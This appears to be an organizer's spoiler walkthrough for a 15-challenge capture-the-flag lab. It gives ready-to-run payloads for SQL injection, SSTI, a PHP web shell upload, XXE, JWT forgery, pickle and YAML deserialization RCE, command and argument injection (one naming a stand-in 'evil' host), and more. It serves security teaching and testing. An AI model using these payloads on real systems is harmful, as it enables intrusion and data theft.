# Solution walkthrough (organizer — SPOILERS)

`scripts/solve.py` runs all 15 automatically (pure stdlib). Below, `$H` is your
host (`localhost`); ports are 8301–8315.

```
1  SQLi   curl -sG $H:8301/cn/v2/object --data-urlencode "nodeId=x' UNION SELECT secret,name FROM cn_secrets-- -"
2  SSTI   curl -s  $H:8302/form/contact --data-urlencode "message={{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"
3  SSRF   curl -s "$H:8303/api/download?url=http://127.0.0.1:9999/latest"
4  LFI    curl -s "$H:8304/?src=file:///var/www/html-secret/flag.txt"       # /etc/passwd is refused
5  Upload curl -s -X POST "$H:8305/api/assets/upload?name=sh.php" --data-binary '<?php system($_GET["c"]); ?>'
          curl -s "$H:8305/uploads/sh.php?c=cat%20/flag"
6  Arg-inj curl -s $H:8306/tools/get -H 'Content-Type: application/json' -d '{"resourceType":"pods","name":"--server=https://evil"}'
7  XXE    curl -s -X POST $H:8307/asset/import -H 'Content-Type: application/xml' \
             --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>'
8  IDOR   curl -s "$H:8308/host/db/host/1/password?field=password"          # id 2 is yours; id 1 is admin's
9  JWT    T=$(python3 -c 'import base64,json;b=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode();print(b({"alg":"none"})+"."+b({"upn":"admin@bastion.local"})+".")')
          curl -s "$H:8309/auth/oidc/sso_login?token=$T"
10 Authz  curl -s "$H:8310/%61dmin/flag"                                    # %61 = 'a'; evades the RBAC prefix check
11 Pickle python3 -c 'import urllib.request,pickle,subprocess
          class P:
              def __reduce__(self): return (subprocess.check_output,(["cat","/flag"],))
          print(urllib.request.urlopen("http://'$H':8311/upload/image",pickle.dumps(P())).read())'
12 PHP    C=$(printf 'O:13:"TemplateCache":1:{s:8:"template";s:5:"/flag";}' | base64)
          curl -s $H:8312/ -H "Cookie: maxsite_comuser=$C"
13 YAML   curl -s -X POST $H:8313/models/load --data-binary '!!python/object/apply:subprocess.check_output [["cat","/flag"]]'
14 Agent  curl -s $H:8314/api/tool/run -H 'Content-Type: application/json' -d '{"command":"ls; cat /flag"}'
15 RESP   printf '*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n' | nc $H 8315                 # raw TCP, no auth
```

## Notes per challenge
- **1** `nodeId` is concatenated into `... WHERE node_id = '<x>'`; a `UNION SELECT`
  of the same column count pulls the flag out of `cn_secrets`.
- **2/13** a server-side template / YAML loader evaluates attacker input; the
  payloads execute `cat /flag`.
- **4** the chroot check is `strpos($real,'/var/www/html')===0`, so the *sibling*
  `/var/www/html-secret` matches the prefix — absolute paths like `/etc/passwd`
  don't, and are refused.
- **6** the JSON `name` begins with `-`, so it is parsed by `kubectl` as the
  `--server` flag; the stubbed kubectl then prints the mounted bearer token.
- **9** the endpoint base64-decodes the JWT body and trusts `upn` with no
  signature check — `alg:none` or any garbage signature works.
- **10** RBAC is evaluated on the raw request target (`/%61dmin/flag`, which does
  not start with `/admin`), but the route resolves the decoded path (`/admin/flag`).
- **15** the Redis-wire plugin never requires `AUTH`, so an unauthenticated
  `GET flag` returns the flag.
